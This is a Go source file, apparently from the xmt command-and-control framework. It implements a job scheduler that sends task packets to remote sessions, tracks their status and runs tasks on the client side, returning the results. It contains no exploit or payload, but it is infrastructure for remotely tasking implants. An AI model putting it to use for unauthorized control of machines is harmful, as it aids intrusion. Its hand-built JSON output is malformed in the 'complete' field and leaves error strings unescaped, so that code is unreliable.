package c2

import (
	"context"
	"strconv"
	"time"

	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// These are status values that indicate the general status of the Job.
const (
	Waiting  status = 0
	Accepted status = iota
	Completed
	Error
)

// ErrCannotAssign is an error returned by the 'Schedule' function when the random loop cannot find a valid
// JobID (unused). This may occur in random circumstances when the Scheduler is overused.
var ErrCannotAssign = xerr.New("unable to assign a unused JobID (is Scheduler full?)")

// Job is a struct that is used to track and manage Tasks given to Session Clients. This struct has function callbacks
// that can be used to watch for completion and also offers a Wait function to pause execution until a response is received.
type Job struct {
	Start, Complete time.Time
	ctx             context.Context

	Result  *com.Packet
	Session *Session
	Update  func(*Job)
	cancel  context.CancelFunc

	Error  string
	ID     uint16
	Type   uint8
	Status status
}
type status uint8

// Scheduler is a handler that can manage and schedule Packets as Jobs to be sent to a Session and tracked. The
// resulting output (or errors) can be tracked by the resulting Job structs.
type Scheduler struct {
	s    *Server
	jobs map[uint16]*Job
}

// Wait will block until the Job is completed or the parent Server is shutdown.
func (j *Job) Wait() {
	<-j.ctx.Done()
}

// IsDone returns true when the Job has received a response.
func (j *Job) IsDone() bool {
	select {
	case <-j.ctx.Done():
		return true
	default:
		return false
	}
}

// IsError returns true when the Job has received a response, but the response is an error.
func (j *Job) IsError() bool {
	if !j.IsDone() {
		return false
	}
	return len(j.Error) > 0
}
func (s status) String() string {
	switch s {
	case Error:
		return "error"
	case Waiting:
		return "waiting"
	case Accepted:
		return "accepted"
	case Completed:
		return "completed"
	}
	return "invalid"
}
func (x *Scheduler) newJobID() uint16 {
	var (
		ok   bool
		i, c uint16
	)
	for ; c < 256; c++ {
		i = uint16(util.FastRand())
		if _, ok = x.jobs[i]; !ok {
			return i
		}
	}
	return 0
}
func (x *Scheduler) json(w *data.Chunk) {
	if !device.IsServer {
		return
	}
	w.WriteUint8(uint8('{'))
	i := 0
	for _, v := range x.jobs {
		if i > 0 {
			w.WriteUint8(uint8(','))
		}
		w.Write([]byte(
			`"` + strconv.Itoa(int(v.ID)) + `": {` +
				`"id":` + strconv.Itoa(int(v.ID)) + `,` +
				`"type":"` + strconv.Itoa(int(v.Type)) + `",` +
				`"error":"` + v.Error + `",` +
				`"status":"` + v.Status.String() + `",` +
				`"start":"` + v.Start.Format(time.RFC3339Nano) + `"`,
		))
		if !v.Complete.IsZero() {
			w.Write([]byte(`,"complete":` + v.Complete.Format(time.RFC3339Nano) + `"`))
		}
		w.WriteUint8(uint8('}'))
		i++
	}
	w.WriteUint8(uint8('}'))
}
func (x *Scheduler) notifyTask(i uint16) {
	if i < 20 || x.jobs == nil || len(x.jobs) == 0 {
		return
	}
	j, ok := x.jobs[i]
	if !ok {
		return
	}
	if j.Status = Accepted; j.Update != nil {
		x.s.events <- event{j: j, jFunc: j.Update}
	}
}

// Task will execute the provided Tasker with the provided Packet as the data input. The Session will be used to return
// the results to and will supply the context to run in. This function may return instantly if the Task is thread
// oriented, but will send the results after completion or error without further interaction.
func Task(t task.Tasker, s *Session, p *com.Packet) {
	if t.Thread() {
		go doTask(t, s, p)
	} else {
		doTask(t, s, p)
	}
}
func doTask(t task.Tasker, s *Session, p *com.Packet) {
	if device.IsServer {
		s.log.Debug("[%s:Task] Starting Task with JobID %d.", s.ID, p.Job)
	}
	r, err := t.Do(s.ctx, p)
	if r == nil {
		r = new(com.Packet)
	}
	if err != nil {
		if device.IsServer {
			s.log.Error("[%s:Task] Received error during JobID %d Task runtime: %s!", s.ID, p.Job, err.Error())
		}
		r.Flags |= com.FlagError
		r.WriteString(err.Error())
	} else {
		if device.IsServer {
			s.log.Debug("[%s:Task] Task with JobID %d completed!", s.ID, p.Job)
		}
	}
	r.ID, r.Job = MvResult, p.Job
	if err := s.write(false, r); err != nil {
		if device.IsServer {
			s.log.Error("[%s:Task] Received error sending Task results: %s!", s.ID, err.Error())
		}
	}
}

// Handle is the function that inherits the Mux interface. This is used to find and redirect received Jobs. This
// Mux is rarely used in Sessions.
func (x *Scheduler) Handle(s *Session, p *com.Packet) {
	if s == nil || p == nil || p.Job <= 1 {
		return
	}
	if p.ID < 20 {
		return
	}
	if x.jobs == nil || len(x.jobs) == 0 {
		if device.IsServer {
			x.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return
	}
	j, ok := x.jobs[p.Job]
	if !ok {
		if device.IsServer {
			x.s.Log.Warning("[%s:Sched] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return
	}
	if device.IsServer {
		x.s.Log.Trace("[%s:Sched] Received response for Job ID %d.", s.ID, j.ID)
	}
	if j.Result, j.Complete, j.Status = p, time.Now(), Completed; p.Flags&com.FlagError != 0 {
		j.Status = Error
		if err := p.ReadString(&j.Error); err != nil {
			j.Error = err.Error()
		}
	}
	delete(x.jobs, j.ID)
	if j.cancel(); j.Update != nil {
		s.s.events <- event{j: j, jFunc: j.Update}
	}
}

// Schedule will schedule the supplied Packet to the Session and will return a Job struct. This struct will indicate
// when a response from the client has been received. This function will write the Packet to the resulting Session.
func (x *Scheduler) Schedule(s *Session, p *com.Packet) (*Job, error) {
	if x.jobs == nil {
		x.jobs = make(map[uint16]*Job, 1)
	}
	if p.Job == 0 {
		if p.Job = x.newJobID(); p.Job == 0 {
			return nil, ErrCannotAssign
		}
	}
	if len(p.Device) == 0 {
		p.Device = s.Device.ID
	}
	if _, ok := x.jobs[p.Job]; ok {
		return nil, xerr.New("job ID " + strconv.Itoa(int(p.Job)) + " is already being tracked")
	}
	if err := s.Write(p); err != nil {
		return nil, err
	}
	j := &Job{ID: p.Job, Type: p.ID, Start: time.Now(), Session: s}
	j.ctx, j.cancel = context.WithCancel(s.s.ctx)
	x.jobs[p.Job] = j
	return j, nil
}
